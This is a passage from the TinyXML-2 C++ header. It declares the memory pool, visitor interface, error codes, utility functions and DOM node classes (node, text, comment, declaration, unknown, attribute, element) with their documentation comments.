	Template child class to create pools of the correct type.
*/
template< int SIZE >
class MemPoolT : public MemPool
{
public:
    MemPoolT() : _root(0), _currentAllocs(0), _nAllocs(0), _maxAllocs(0), _nUntracked(0)	{}
    ~MemPoolT() {
        Clear();
    }
    
    void Clear() {
        // Delete the blocks.
        while( !_blockPtrs.Empty()) {
            Block* b  = _blockPtrs.Pop();
            delete b;
        }
        _root = 0;
        _currentAllocs = 0;
        _nAllocs = 0;
        _maxAllocs = 0;
        _nUntracked = 0;
    }

    virtual int ItemSize() const	{
        return SIZE;
    }
    int CurrentAllocs() const		{
        return _currentAllocs;
    }

    virtual void* Alloc() {
        if ( !_root ) {
            // Need a new block.
            Block* block = new Block();
            _blockPtrs.Push( block );

            for( int i=0; i<COUNT-1; ++i ) {
                block->chunk[i].next = &block->chunk[i+1];
            }
            block->chunk[COUNT-1].next = 0;
            _root = block->chunk;
        }
        void* result = _root;
        _root = _root->next;

        ++_currentAllocs;
        if ( _currentAllocs > _maxAllocs ) {
            _maxAllocs = _currentAllocs;
        }
        _nAllocs++;
        _nUntracked++;
        return result;
    }
    
    virtual void Free( void* mem ) {
        if ( !mem ) {
            return;
        }
        --_currentAllocs;
        Chunk* chunk = static_cast<Chunk*>( mem );
#ifdef DEBUG
        memset( chunk, 0xfe, sizeof(Chunk) );
#endif
        chunk->next = _root;
        _root = chunk;
    }
    void Trace( const char* name ) {
        printf( "Mempool %s watermark=%d [%dk] current=%d size=%d nAlloc=%d blocks=%d\n",
                name, _maxAllocs, _maxAllocs*SIZE/1024, _currentAllocs, SIZE, _nAllocs, _blockPtrs.Size() );
    }

    void SetTracked() {
        _nUntracked--;
    }

    int Untracked() const {
        return _nUntracked;
    }

	// This number is perf sensitive. 4k seems like a good tradeoff on my machine.
	// The test file is large, 170k.
	// Release:		VS2010 gcc(no opt)
	//		1k:		4000
	//		2k:		4000
	//		4k:		3900	21000
	//		16k:	5200
	//		32k:	4300
	//		64k:	4000	21000
    enum { COUNT = (4*1024)/SIZE }; // Some compilers do not accept to use COUNT in private part if COUNT is private

private:
    MemPoolT( const MemPoolT& ); // not supported
    void operator=( const MemPoolT& ); // not supported

    union Chunk {
        Chunk*  next;
        char    mem[SIZE];
    };
    struct Block {
        Chunk chunk[COUNT];
    };
    DynArray< Block*, 10 > _blockPtrs;
    Chunk* _root;

    int _currentAllocs;
    int _nAllocs;
    int _maxAllocs;
    int _nUntracked;
};



/**
	Implements the interface to the "Visitor pattern" (see the Accept() method.)
	If you call the Accept() method, it requires being passed a XMLVisitor
	class to handle callbacks. For nodes that contain other nodes (Document, Element)
	you will get called with a VisitEnter/VisitExit pair. Nodes that are always leafs
	are simply called with Visit().

	If you return 'true' from a Visit method, recursive parsing will continue. If you return
	false, <b>no children of this node or its siblings</b> will be visited.

	All flavors of Visit methods have a default implementation that returns 'true' (continue
	visiting). You need to only override methods that are interesting to you.

	Generally Accept() is called on the XMLDocument, although all nodes support visiting.

	You should never change the document from a callback.

	@sa XMLNode::Accept()
*/
class TINYXML2_LIB XMLVisitor
{
public:
    virtual ~XMLVisitor() {}

    /// Visit a document.
    virtual bool VisitEnter( const XMLDocument& /*doc*/ )			{
        return true;
    }
    /// Visit a document.
    virtual bool VisitExit( const XMLDocument& /*doc*/ )			{
        return true;
    }

    /// Visit an element.
    virtual bool VisitEnter( const XMLElement& /*element*/, const XMLAttribute* /*firstAttribute*/ )	{
        return true;
    }
    /// Visit an element.
    virtual bool VisitExit( const XMLElement& /*element*/ )			{
        return true;
    }

    /// Visit a declaration.
    virtual bool Visit( const XMLDeclaration& /*declaration*/ )		{
        return true;
    }
    /// Visit a text node.
    virtual bool Visit( const XMLText& /*text*/ )					{
        return true;
    }
    /// Visit a comment node.
    virtual bool Visit( const XMLComment& /*comment*/ )				{
        return true;
    }
    /// Visit an unknown node.
    virtual bool Visit( const XMLUnknown& /*unknown*/ )				{
        return true;
    }
};

// WARNING: must match XMLDocument::_errorNames[]
enum XMLError {
    XML_SUCCESS = 0,
    XML_NO_ERROR = 0,
    XML_NO_ATTRIBUTE,
    XML_WRONG_ATTRIBUTE_TYPE,
    XML_ERROR_FILE_NOT_FOUND,
    XML_ERROR_FILE_COULD_NOT_BE_OPENED,
    XML_ERROR_FILE_READ_ERROR,
    XML_ERROR_ELEMENT_MISMATCH,
    XML_ERROR_PARSING_ELEMENT,
    XML_ERROR_PARSING_ATTRIBUTE,
    XML_ERROR_IDENTIFYING_TAG,
    XML_ERROR_PARSING_TEXT,
    XML_ERROR_PARSING_CDATA,
    XML_ERROR_PARSING_COMMENT,
    XML_ERROR_PARSING_DECLARATION,
    XML_ERROR_PARSING_UNKNOWN,
    XML_ERROR_EMPTY_DOCUMENT,
    XML_ERROR_MISMATCHED_ELEMENT,
    XML_ERROR_PARSING,
    XML_CAN_NOT_CONVERT_TEXT,
    XML_NO_TEXT_NODE,

	XML_ERROR_COUNT
};


/*
	Utility functionality.
*/
class XMLUtil
{
public:
    static const char* SkipWhiteSpace( const char* p )	{
        TIXMLASSERT( p );
        while( IsWhiteSpace(*p) ) {
            ++p;
        }
        TIXMLASSERT( p );
        return p;
    }
    static char* SkipWhiteSpace( char* p )				{
        return const_cast<char*>( SkipWhiteSpace( const_cast<const char*>(p) ) );
    }

    // Anything in the high order range of UTF-8 is assumed to not be whitespace. This isn't
    // correct, but simple, and usually works.
    static bool IsWhiteSpace( char p )					{
        return !IsUTF8Continuation(p) && isspace( static_cast<unsigned char>(p) );
    }
    
    inline static bool IsNameStartChar( unsigned char ch ) {
        if ( ch >= 128 ) {
            // This is a heuristic guess in attempt to not implement Unicode-aware isalpha()
            return true;
        }
        if ( isalpha( ch ) ) {
            return true;
        }
        return ch == ':' || ch == '_';
    }
    
    inline static bool IsNameChar( unsigned char ch ) {
        return IsNameStartChar( ch )
               || isdigit( ch )
               || ch == '.'
               || ch == '-';
    }

    inline static bool StringEqual( const char* p, const char* q, int nChar=INT_MAX )  {
        if ( p == q ) {
            return true;
        }
        int n = 0;
        while( *p && *q && *p == *q && n<nChar ) {
            ++p;
            ++q;
            ++n;
        }
        if ( (n == nChar) || ( *p == 0 && *q == 0 ) ) {
            return true;
        }
        return false;
    }
    
    inline static bool IsUTF8Continuation( const char p ) {
        return ( p & 0x80 ) != 0;
    }

    static const char* ReadBOM( const char* p, bool* hasBOM );
    // p is the starting location,
    // the UTF-8 value of the entity will be placed in value, and length filled in.
    static const char* GetCharacterRef( const char* p, char* value, int* length );
    static void ConvertUTF32ToUTF8( unsigned long input, char* output, int* length );

    // converts primitive types to strings
    static void ToStr( int v, char* buffer, int bufferSize );
    static void ToStr( unsigned v, char* buffer, int bufferSize );
    static void ToStr( bool v, char* buffer, int bufferSize );
    static void ToStr( float v, char* buffer, int bufferSize );
    static void ToStr( double v, char* buffer, int bufferSize );

    // converts strings to primitive types
    static bool	ToInt( const char* str, int* value );
    static bool ToUnsigned( const char* str, unsigned* value );
    static bool	ToBool( const char* str, bool* value );
    static bool	ToFloat( const char* str, float* value );
    static bool ToDouble( const char* str, double* value );
};


/** XMLNode is a base class for every object that is in the
	XML Document Object Model (DOM), except XMLAttributes.
	Nodes have siblings, a parent, and children which can
	be navigated. A node is always in a XMLDocument.
	The type of a XMLNode can be queried, and it can
	be cast to its more defined type.

	A XMLDocument allocates memory for all its Nodes.
	When the XMLDocument gets deleted, all its Nodes
	will also be deleted.

	@verbatim
	A Document can contain:	Element	(container or leaf)
							Comment (leaf)
							Unknown (leaf)
							Declaration( leaf )

	An Element can contain:	Element (container or leaf)
							Text	(leaf)
							Attributes (not on tree)
							Comment (leaf)
							Unknown (leaf)

	@endverbatim
*/
class TINYXML2_LIB XMLNode
{
    friend class XMLDocument;
    friend class XMLElement;
public:

    /// Get the XMLDocument that owns this XMLNode.
    const XMLDocument* GetDocument() const	{
        return _document;
    }
    /// Get the XMLDocument that owns this XMLNode.
    XMLDocument* GetDocument()				{
        return _document;
    }

    /// Safely cast to an Element, or null.
    virtual XMLElement*		ToElement()		{
        return 0;
    }
    /// Safely cast to Text, or null.
    virtual XMLText*		ToText()		{
        return 0;
    }
    /// Safely cast to a Comment, or null.
    virtual XMLComment*		ToComment()		{
        return 0;
    }
    /// Safely cast to a Document, or null.
    virtual XMLDocument*	ToDocument()	{
        return 0;
    }
    /// Safely cast to a Declaration, or null.
    virtual XMLDeclaration*	ToDeclaration()	{
        return 0;
    }
    /// Safely cast to an Unknown, or null.
    virtual XMLUnknown*		ToUnknown()		{
        return 0;
    }

    virtual const XMLElement*		ToElement() const		{
        return 0;
    }
    virtual const XMLText*			ToText() const			{
        return 0;
    }
    virtual const XMLComment*		ToComment() const		{
        return 0;
    }
    virtual const XMLDocument*		ToDocument() const		{
        return 0;
    }
    virtual const XMLDeclaration*	ToDeclaration() const	{
        return 0;
    }
    virtual const XMLUnknown*		ToUnknown() const		{
        return 0;
    }

    /** The meaning of 'value' changes for the specific type.
    	@verbatim
    	Document:	empty
    	Element:	name of the element
    	Comment:	the comment text
    	Unknown:	the tag contents
    	Text:		the text string
    	@endverbatim
    */
    const char* Value() const;

    /** Set the Value of an XML node.
    	@sa Value()
    */
    void SetValue( const char* val, bool staticMem=false );

    /// Get the parent of this node on the DOM.
    const XMLNode*	Parent() const			{
        return _parent;
    }

    XMLNode* Parent()						{
        return _parent;
    }

    /// Returns true if this node has no children.
    bool NoChildren() const					{
        return !_firstChild;
    }

    /// Get the first child node, or null if none exists.
    const XMLNode*  FirstChild() const		{
        return _firstChild;
    }

    XMLNode*		FirstChild()			{
        return _firstChild;
    }

    /** Get the first child element, or optionally the first child
        element with the specified name.
    */
    const XMLElement* FirstChildElement( const char* value=0 ) const;

    XMLElement* FirstChildElement( const char* value=0 )	{
        return const_cast<XMLElement*>(const_cast<const XMLNode*>(this)->FirstChildElement( value ));
    }

    /// Get the last child node, or null if none exists.
    const XMLNode*	LastChild() const						{
        return _lastChild;
    }

    XMLNode*		LastChild()								{
        return _lastChild;
    }

    /** Get the last child element or optionally the last child
        element with the specified name.
    */
    const XMLElement* LastChildElement( const char* value=0 ) const;

    XMLElement* LastChildElement( const char* value=0 )	{
        return const_cast<XMLElement*>(const_cast<const XMLNode*>(this)->LastChildElement(value) );
    }

    /// Get the previous (left) sibling node of this node.
    const XMLNode*	PreviousSibling() const					{
        return _prev;
    }

    XMLNode*	PreviousSibling()							{
        return _prev;
    }

    /// Get the previous (left) sibling element of this node, with an optionally supplied name.
    const XMLElement*	PreviousSiblingElement( const char* value=0 ) const ;

    XMLElement*	PreviousSiblingElement( const char* value=0 ) {
        return const_cast<XMLElement*>(const_cast<const XMLNode*>(this)->PreviousSiblingElement( value ) );
    }

    /// Get the next (right) sibling node of this node.
    const XMLNode*	NextSibling() const						{
        return _next;
    }

    XMLNode*	NextSibling()								{
        return _next;
    }

    /// Get the next (right) sibling element of this node, with an optionally supplied name.
    const XMLElement*	NextSiblingElement( const char* value=0 ) const;

    XMLElement*	NextSiblingElement( const char* value=0 )	{
        return const_cast<XMLElement*>(const_cast<const XMLNode*>(this)->NextSiblingElement( value ) );
    }

    /**
    	Add a child node as the last (right) child.
		If the child node is already part of the document,
		it is moved from its old location to the new location.
		Returns the addThis argument or 0 if the node does not
		belong to the same document.
    */
    XMLNode* InsertEndChild( XMLNode* addThis );

    XMLNode* LinkEndChild( XMLNode* addThis )	{
        return InsertEndChild( addThis );
    }
    /**
    	Add a child node as the first (left) child.
		If the child node is already part of the document,
		it is moved from its old location to the new location.
		Returns the addThis argument or 0 if the node does not
		belong to the same document.
    */
    XMLNode* InsertFirstChild( XMLNode* addThis );
    /**
    	Add a node after the specified child node.
		If the child node is already part of the document,
		it is moved from its old location to the new location.
		Returns the addThis argument or 0 if the afterThis node
		is not a child of this node, or if the node does not
		belong to the same document.
    */
    XMLNode* InsertAfterChild( XMLNode* afterThis, XMLNode* addThis );

    /**
    	Delete all the children of this node.
    */
    void DeleteChildren();

    /**
    	Delete a child of this node.
    */
    void DeleteChild( XMLNode* node );

    /**
    	Make a copy of this node, but not its children.
    	You may pass in a Document pointer that will be
    	the owner of the new Node. If the 'document' is
    	null, then the node returned will be allocated
    	from the current Document. (this->GetDocument())

    	Note: if called on a XMLDocument, this will return null.
    */
    virtual XMLNode* ShallowClone( XMLDocument* document ) const = 0;

    /**
    	Test if 2 nodes are the same, but don't test children.
    	The 2 nodes do not need to be in the same Document.

    	Note: if called on a XMLDocument, this will return false.
    */
    virtual bool ShallowEqual( const XMLNode* compare ) const = 0;

    /** Accept a hierarchical visit of the nodes in the TinyXML-2 DOM. Every node in the
    	XML tree will be conditionally visited and the host will be called back
    	via the XMLVisitor interface.

    	This is essentially a SAX interface for TinyXML-2. (Note however it doesn't re-parse
    	the XML for the callbacks, so the performance of TinyXML-2 is unchanged by using this
    	interface versus any other.)

    	The interface has been based on ideas from:

    	- http://www.saxproject.org/
    	- http://c2.com/cgi/wiki?HierarchicalVisitorPattern

    	Which are both good references for "visiting".

    	An example of using Accept():
    	@verbatim
    	XMLPrinter printer;
    	tinyxmlDoc.Accept( &printer );
    	const char* xmlcstr = printer.CStr();
    	@endverbatim
    */
    virtual bool Accept( XMLVisitor* visitor ) const = 0;

protected:
    XMLNode( XMLDocument* );
    virtual ~XMLNode();

    virtual char* ParseDeep( char*, StrPair* );

    XMLDocument*	_document;
    XMLNode*		_parent;
    mutable StrPair	_value;

    XMLNode*		_firstChild;
    XMLNode*		_lastChild;

    XMLNode*		_prev;
    XMLNode*		_next;

private:
    MemPool*		_memPool;
    void Unlink( XMLNode* child );
    static void DeleteNode( XMLNode* node );
    void InsertChildPreamble( XMLNode* insertThis ) const;

    XMLNode( const XMLNode& );	// not supported
    XMLNode& operator=( const XMLNode& );	// not supported
};


/** XML text.

	Note that a text node can have child element nodes, for example:
	@verbatim
	<root>This is <b>bold</b></root>
	@endverbatim

	A text node can have 2 ways to output the next. "normal" output
	and CDATA. It will default to the mode it was parsed from the XML file and
	you generally want to leave it alone, but you can change the output mode with
	SetCData() and query it with CData().
*/
class TINYXML2_LIB XMLText : public XMLNode
{
    friend class XMLBase;
    friend class XMLDocument;
public:
    virtual bool Accept( XMLVisitor* visitor ) const;

    virtual XMLText* ToText()			{
        return this;
    }
    virtual const XMLText* ToText() const	{
        return this;
    }

    /// Declare whether this should be CDATA or standard text.
    void SetCData( bool isCData )			{
        _isCData = isCData;
    }
    /// Returns true if this is a CDATA text element.
    bool CData() const						{
        return _isCData;
    }

    virtual XMLNode* ShallowClone( XMLDocument* document ) const;
    virtual bool ShallowEqual( const XMLNode* compare ) const;

protected:
    XMLText( XMLDocument* doc )	: XMLNode( doc ), _isCData( false )	{}
    virtual ~XMLText()												{}

    char* ParseDeep( char*, StrPair* endTag );

private:
    bool _isCData;

    XMLText( const XMLText& );	// not supported
    XMLText& operator=( const XMLText& );	// not supported
};


/** An XML Comment. */
class TINYXML2_LIB XMLComment : public XMLNode
{
    friend class XMLDocument;
public:
    virtual XMLComment*	ToComment()					{
        return this;
    }
    virtual const XMLComment* ToComment() const		{
        return this;
    }

    virtual bool Accept( XMLVisitor* visitor ) const;

    virtual XMLNode* ShallowClone( XMLDocument* document ) const;
    virtual bool ShallowEqual( const XMLNode* compare ) const;

protected:
    XMLComment( XMLDocument* doc );
    virtual ~XMLComment();

    char* ParseDeep( char*, StrPair* endTag );

private:
    XMLComment( const XMLComment& );	// not supported
    XMLComment& operator=( const XMLComment& );	// not supported
};


/** In correct XML the declaration is the first entry in the file.
	@verbatim
		<?xml version="1.0" standalone="yes"?>
	@endverbatim

	TinyXML-2 will happily read or write files without a declaration,
	however.

	The text of the declaration isn't interpreted. It is parsed
	and written as a string.
*/
class TINYXML2_LIB XMLDeclaration : public XMLNode
{
    friend class XMLDocument;
public:
    virtual XMLDeclaration*	ToDeclaration()					{
        return this;
    }
    virtual const XMLDeclaration* ToDeclaration() const		{
        return this;
    }

    virtual bool Accept( XMLVisitor* visitor ) const;

    virtual XMLNode* ShallowClone( XMLDocument* document ) const;
    virtual bool ShallowEqual( const XMLNode* compare ) const;

protected:
    XMLDeclaration( XMLDocument* doc );
    virtual ~XMLDeclaration();

    char* ParseDeep( char*, StrPair* endTag );

private:
    XMLDeclaration( const XMLDeclaration& );	// not supported
    XMLDeclaration& operator=( const XMLDeclaration& );	// not supported
};


/** Any tag that TinyXML-2 doesn't recognize is saved as an
	unknown. It is a tag of text, but should not be modified.
	It will be written back to the XML, unchanged, when the file
	is saved.

	DTD tags get thrown into XMLUnknowns.
*/
class TINYXML2_LIB XMLUnknown : public XMLNode
{
    friend class XMLDocument;
public:
    virtual XMLUnknown*	ToUnknown()					{
        return this;
    }
    virtual const XMLUnknown* ToUnknown() const		{
        return this;
    }

    virtual bool Accept( XMLVisitor* visitor ) const;

    virtual XMLNode* ShallowClone( XMLDocument* document ) const;
    virtual bool ShallowEqual( const XMLNode* compare ) const;

protected:
    XMLUnknown( XMLDocument* doc );
    virtual ~XMLUnknown();

    char* ParseDeep( char*, StrPair* endTag );

private:
    XMLUnknown( const XMLUnknown& );	// not supported
    XMLUnknown& operator=( const XMLUnknown& );	// not supported
};



/** An attribute is a name-value pair. Elements have an arbitrary
	number of attributes, each with a unique name.

	@note The attributes are not XMLNodes. You may only query the
	Next() attribute in a list.
*/
class TINYXML2_LIB XMLAttribute
{
    friend class XMLElement;
public:
    /// The name of the attribute.
    const char* Name() const;

    /// The value of the attribute.
    const char* Value() const;

    /// The next attribute in the list.
    const XMLAttribute* Next() const {
        return _next;
    }

    /** IntValue interprets the attribute as an integer, and returns the value.
        If the value isn't an integer, 0 will be returned. There is no error checking;
    	use QueryIntValue() if you need error checking.
    */
    int		 IntValue() const				{
        int i=0;
        QueryIntValue( &i );
        return i;
    }
    /// Query as an unsigned integer. See IntValue()
    unsigned UnsignedValue() const			{
        unsigned i=0;
        QueryUnsignedValue( &i );
        return i;
    }
    /// Query as a boolean. See IntValue()
    bool	 BoolValue() const				{
        bool b=false;
        QueryBoolValue( &b );
        return b;
    }
    /// Query as a double. See IntValue()
    double 	 DoubleValue() const			{
        double d=0;
        QueryDoubleValue( &d );
        return d;
    }
    /// Query as a float. See IntValue()
    float	 FloatValue() const				{
        float f=0;
        QueryFloatValue( &f );
        return f;
    }

    /** QueryIntValue interprets the attribute as an integer, and returns the value
    	in the provided parameter. The function will return XML_NO_ERROR on success,
    	and XML_WRONG_ATTRIBUTE_TYPE if the conversion is not successful.
    */
    XMLError QueryIntValue( int* value ) const;
    /// See QueryIntValue
    XMLError QueryUnsignedValue( unsigned int* value ) const;
    /// See QueryIntValue
    XMLError QueryBoolValue( bool* value ) const;
    /// See QueryIntValue
    XMLError QueryDoubleValue( double* value ) const;
    /// See QueryIntValue
    XMLError QueryFloatValue( float* value ) const;

    /// Set the attribute to a string value.
    void SetAttribute( const char* value );
    /// Set the attribute to value.
    void SetAttribute( int value );
    /// Set the attribute to value.
    void SetAttribute( unsigned value );
    /// Set the attribute to value.
    void SetAttribute( bool value );
    /// Set the attribute to value.
    void SetAttribute( double value );
    /// Set the attribute to value.
    void SetAttribute( float value );

private:
    enum { BUF_SIZE = 200 };

    XMLAttribute() : _next( 0 ), _memPool( 0 ) {}
    virtual ~XMLAttribute()	{}

    XMLAttribute( const XMLAttribute& );	// not supported
    void operator=( const XMLAttribute& );	// not supported
    void SetName( const char* name );

    char* ParseDeep( char* p, bool processEntities );

    mutable StrPair _name;
    mutable StrPair _value;
    XMLAttribute*   _next;
    MemPool*        _memPool;
};


/** The element is a container class. It has a value, the element name,
	and can contain other elements, text, comments, and unknowns.
	Elements also contain an arbitrary number of attributes.
*/
class TINYXML2_LIB XMLElement : public XMLNode
{
    friend class XMLBase;
    friend class XMLDocument;
public:
    /// Get the name of an element (which is the Value() of the node.)
    const char* Name() const		{
        return Value();
    }
    /// Set the name of the element.
    void SetName( const char* str, bool staticMem=false )	{
        SetValue( str, staticMem );
    }

    virtual XMLElement* ToElement()				{
        return this;
    }
    virtual const XMLElement* ToElement() const {
        return this;
    }
    virtual bool Accept( XMLVisitor* visitor ) const;

    /** Given an attribute name, Attribute() returns the value
    	for the attribute of that name, or null if none
    	exists. For example:

    	@verbatim
    	const char* value = ele->Attribute( "foo" );
    	@endverbatim

    	The 'value' parameter is normally null. However, if specified,
    	the attribute will only be returned if the 'name' and 'value'
    	match. This allow you to write code:

    	@verbatim
    	if ( ele->Attribute( "foo", "bar" ) ) callFooIsBar();
    	@endverbatim

    	rather than:
    	@verbatim
    	if ( ele->Attribute( "foo" ) ) {
    		if ( strcmp( ele->Attribute( "foo" ), "bar" ) == 0 ) callFooIsBar();
    	}
    	@endverbatim
    */
    const char* Attribute( const char* name, const char* value=0 ) const;

    /** Given an attribute name, IntAttribute() returns the value
    	of the attribute interpreted as an integer. 0 will be
    	returned if there is an error. For a method with error
    	checking, see QueryIntAttribute()
    */
    int		 IntAttribute( const char* name ) const		{
        int i=0;
        QueryIntAttribute( name, &i );
        return i;
    }
    /// See IntAttribute()
    unsigned UnsignedAttribute( const char* name ) const {
        unsigned i=0;
        QueryUnsignedAttribute( name, &i );
        return i;
    }
    /// See IntAttribute()
    bool	 BoolAttribute( const char* name ) const	{
        bool b=false;
        QueryBoolAttribute( name, &b );
        return b;
    }
    /// See IntAttribute()
    double 	 DoubleAttribute( const char* name ) const	{
        double d=0;
        QueryDoubleAttribute( name, &d );
        return d;
    }
    /// See IntAttribute()
    float	 FloatAttribute( const char* name ) const	{
        float f=0;
        QueryFloatAttribute( name, &f );
        return f;
    }

    /** Given an attribute name, QueryIntAttribute() returns
    	XML_NO_ERROR, XML_WRONG_ATTRIBUTE_TYPE if the conversion
    	can't be performed, or XML_NO_ATTRIBUTE if the attribute
    	doesn't exist. If successful, the result of the conversion
    	will be written to 'value'. If not successful, nothing will
    	be written to 'value'. This allows you to provide default
    	value:

    	@verbatim
    	int value = 10;
    	QueryIntAttribute( "foo", &value );		// if "foo" isn't found, value will still be 10
    	@endverbatim
    */
    XMLError QueryIntAttribute( const char* name, int* value ) const				{
        const XMLAttribute* a = FindAttribute( name );
        if ( !a ) {
            return XML_NO_ATTRIBUTE;
        }
        return a->QueryIntValue( value );
    }
    /// See QueryIntAttribute()
    XMLError QueryUnsignedAttribute( const char* name, unsigned int* value ) const	{
        const XMLAttribute* a = FindAttribute( name );
        if ( !a ) {
            return XML_NO_ATTRIBUTE;
        }
        return a->QueryUnsignedValue( value );
    }
    /// See QueryIntAttribute()
    XMLError QueryBoolAttribute( const char* name, bool* value ) const				{
        const XMLAttribute* a = FindAttribute( name );
        if ( !a ) {
            return XML_NO_ATTRIBUTE;
        }
        return a->QueryBoolValue( value );
    }
    /// See QueryIntAttribute()
    XMLError QueryDoubleAttribute( const char* name, double* value ) const			{
        const XMLAttribute* a = FindAttribute( name );
        if ( !a ) {
            return XML_NO_ATTRIBUTE;
        }
        return a->QueryDoubleValue( value );
    }
    /// See QueryIntAttribute()
    XMLError QueryFloatAttribute( const char* name, float* value ) const			{
        const XMLAttribute* a = FindAttribute( name );
        if ( !a ) {
            return XML_NO_ATTRIBUTE;
        }
        return a->QueryFloatValue( value );
    }

	
    /** Given an attribute name, QueryAttribute() returns
    	XML_NO_ERROR, XML_WRONG_ATTRIBUTE_TYPE if the conversion
    	can't be performed, or XML_NO_ATTRIBUTE if the attribute
    	doesn't exist. It is overloaded for the primitive types,
		and is a generally more convenient replacement of
		QueryIntAttribute() and related functions.
		
		If successful, the result of the conversion
    	will be written to 'value'. If not successful, nothing will
    	be written to 'value'. This allows you to provide default
    	value:

    	@verbatim
    	int value = 10;
    	QueryAttribute( "foo", &value );		// if "foo" isn't found, value will still be 10
    	@endverbatim
    */
	int QueryAttribute( const char* name, int* value ) const {
		return QueryIntAttribute( name, value );
	}

	int QueryAttribute( const char* name, unsigned int* value ) const {
		return QueryUnsignedAttribute( name, value );
	}

	int QueryAttribute( const char* name, bool* value ) const {
		return QueryBoolAttribute( name, value );
	}

	int QueryAttribute( const char* name, double* value ) const {
		return QueryDoubleAttribute( name, value );
	}

	int QueryAttribute( const char* name, float* value ) const {
		return QueryFloatAttribute( name, value );
	}

	/// Sets the named attribute to value.
    void SetAttribute( const char* name, const char* value )	{
        XMLAttribute* a = FindOrCreateAttribute( name );
        a->SetAttribute( value );
    }
    /// Sets the named attribute to value.
    void SetAttribute( const char* name, int value )			{
        XMLAttribute* a = FindOrCreateAttribute( name );
        a->SetAttribute( value );
    }
    /// Sets the named attribute to value.
    void SetAttribute( const char* name, unsigned value )		{
        XMLAttribute* a = FindOrCreateAttribute( name );
        a->SetAttribute( value );
    }
    /// Sets the named attribute to value.
    void SetAttribute( const char* name, bool value )			{
        XMLAttribute* a = FindOrCreateAttribute( name );
        a->SetAttribute( value );
    }
    /// Sets the named attribute to value.
    void SetAttribute( const char* name, double value )		{
        XMLAttribute* a = FindOrCreateAttribute( name );
        a->SetAttribute( value );
    }
    /// Sets the named attribute to value.
    void SetAttribute( const char* name, float value )		{
        XMLAttribute* a = FindOrCreateAttribute( name );
        a->SetAttribute( value );
    }

    /**
    	Delete an attribute.
    */
    void DeleteAttribute( const char* name );

    /// Return the first attribute in the list.
    const XMLAttribute* FirstAttribute() const {
        return _rootAttribute;
    }
    /// Query a specific attribute in the list.
    const XMLAttribute* FindAttribute( const char* name ) const;

    /** Convenience function for easy access to the text inside an element. Although easy
    	and concise, GetText() is limited compared to getting the XMLText child
    	and accessing it directly.

    	If the first child of 'this' is a XMLText, the GetText()
    	returns the character string of the Text node, else null is returned.

    	This is a convenient method for getting the text of simple contained text:
    	@verbatim
    	<foo>This is text</foo>
    		const char* str = fooElement->GetText();
    	@endverbatim

    	'str' will be a pointer to "This is text".

    	Note that this function can be misleading. If the element foo was created from
    	this XML:
    	@verbatim
    		<foo><b>This is text</b></foo>
    	@endverbatim

    	then the value of str would be null. The first child node isn't a text node, it is
    	another element. From this XML:
    	@verbatim
    		<foo>This is <b>text</b></foo>
    	@endverbatim
    	GetText() will return "This is ".
    */
    const char* GetText() const;

    /** Convenience function for easy access to the text inside an element. Although easy
    	and concise, SetText() is limited compared to creating an XMLText child
    	and mutating it directly.

    	If the first child of 'this' is a XMLText, SetText() sets its value to
		the given string, otherwise it will create a first child that is an XMLText.

    	This is a convenient method for setting the text of simple contained text:
    	@verbatim
    	<foo>This is text</foo>
    		fooElement->SetText( "Hullaballoo!" );
     	<foo>Hullaballoo!</foo>
		@endverbatim

    	Note that this function can be misleading. If the element foo was created from
    	this XML:
    	@verbatim
    		<foo><b>This is text</b></foo>
    	@endverbatim

    	then it will not change "This is text", but rather prefix it with a text element:
    	@verbatim
    		<foo>Hullaballoo!<b>This is text</b></foo>
    	@endverbatim
		
		For this XML:
    	@verbatim
    		<foo />
    	@endverbatim
    	SetText() will generate
    	@verbatim
    		<foo>Hullaballoo!</foo>
    	@endverbatim
    */
	void SetText( const char* inText );
    /// Convenience method for setting text inside and element. See SetText() for important limitations.
    void SetText( int value );
    /// Convenience method for setting text inside and element. See SetText() for important limitations.
    void SetText( unsigned value );  
    /// Convenience method for setting text inside and element. See SetText() for important limitations.
    void SetText( bool value );  
    /// Convenience method for setting text inside and element. See SetText() for important limitations.
    void SetText( double value );  
    /// Convenience method for setting text inside and element. See SetText() for important limitations.
    void SetText( float value );  

    /**
    	Convenience method to query the value of a child text node. This is probably best
    	shown by example. Given you have a document is this form:
    	@verbatim
    		<point>
    			<x>1</x>
    			<y>1.4</y>
    		</point>
    	@endverbatim

    	The QueryIntText() and similar functions provide a safe and easier way to get to the
    	"value" of x and y.

    	@verbatim
    		int x = 0;
    		float y = 0;	// types of x and y are contrived for example
    		const XMLElement* xElement = pointElement->FirstChildElement( "x" );
    		const XMLElement* yElement = pointElement->FirstChildElement( "y" );
    		xElement->QueryIntText( &x );
    		yElement->QueryFloatText( &y );
    	@endverbatim

    	@returns XML_SUCCESS (0) on success, XML_CAN_NOT_CONVERT_TEXT if the text cannot be converted
    			 to the requested type, and XML_NO_TEXT_NODE if there is no child text to query.

    */
    XMLError QueryIntText( int* ival ) const;
    /// See QueryIntText()
    XMLError QueryUnsignedText( unsigned* uval ) const;
    /// See QueryIntText()
    XMLError QueryBoolText( bool* bval ) const;
    /// See QueryIntText()
    XMLError QueryDoubleText( double* dval ) const;
    /// See QueryIntText()
    XMLError QueryFloatText( float* fval ) const;

    // internal:
    enum {
        OPEN,		// <foo>
        CLOSED,		// <foo/>
        CLOSING		// </foo>
    };
    int ClosingType() const {
        return _closingType;
    }
    virtual XMLNode* ShallowClone( XMLDocument* document ) const;
    virtual bool ShallowEqual( const XMLNode* compare ) const;

protected:
    char* ParseDeep( char* p, StrPair* endTag );

private:
    XMLElement( XMLDocument* doc );
    virtual ~XMLElement();
    XMLElement( const XMLElement& );	// not supported
    void operator=( const XMLElement& );	// not supported

    XMLAttribute* FindAttribute( const char* name ) {
        return const_cast<XMLAttribute*>(const_cast<const XMLElement*>(this)->FindAttribute( name ));
    }
    XMLAttribute* FindOrCreateAttribute( const char* name );
    //void LinkAttribute( XMLAttribute* attrib );
    char* ParseAttributes( char* p );
    static void DeleteAttribute( XMLAttribute* attribute );

    enum { BUF_SIZE = 200 };
    int _closingType;
    // The attribute list is ordered; there is no 'lastAttribute'
    // because the list needs to be scanned for dupes before adding
    // a new attribute.
    XMLAttribute* _rootAttribute;
};


enum Whitespace {
    PRESERVE_WHITESPACE,
    COLLAPSE_WHITESPACE
};


/** A Document binds together all the functionality.
	It can be saved, loaded, and printed to the screen.
	All Nodes are connected and allocated to a Document.
	If the Document is deleted, all its Nodes are also deleted.
*/
class TINYXML2_LIB XMLDocument : public XMLNode
{
    friend class XMLElement;
public:
    /// constructor
    XMLDocument( bool processEntities = true, Whitespace = PRESERVE_WHITESPACE );
